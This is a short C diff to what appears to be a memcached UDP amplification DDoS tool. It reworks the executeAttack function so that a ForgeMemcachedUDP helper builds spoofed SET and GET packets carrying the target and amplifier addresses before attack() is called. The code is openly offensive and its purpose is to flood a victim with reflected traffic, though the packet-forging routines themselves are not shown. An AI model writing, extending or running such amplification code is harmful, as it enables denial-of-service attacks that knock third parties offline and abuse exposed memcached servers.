@@ -102,18 +102,15 @@ void
 executeAttack( AttackPlan * plan )
 {
   AttackData * atkData;
-  Packet * memcachedPkt;
 
   memalloc( (void *)&atkData, sizeof( AttackData ), __func__);
   
   atkData->atkPlan = plan;
    
-  memcachedPkt = forgeMemcached(  SET );
-  atkData->setPacket = forgeUDP(plan->target_ip, plan->amp_ip, plan->target_port, plan->amp_port, memcachedPkt->packet_ptr, memcachedPkt->size);
+  atkData->setPacket = ForgeMemcachedUDP( plan->amp_ip, plan->target_ip, plan->target_port, plan->amp_port, MEMCACHED_SET );
 
-  memcachedPkt = forgeMemcached(  GET );
-  atkData->getPacket = forgeUDP(plan->target_ip, plan->amp_ip, plan->target_port, plan->amp_port, memcachedPkt->packet_ptr, memcachedPkt->size);
-
+  atkData->getPacket = ForgeMemcachedUDP( plan->amp_ip, plan->target_ip, plan->target_port, plan->amp_port, MEMCACHED_GET );
+ 
   attack( atkData );
 
   release_packet( &atkData->setPacket);
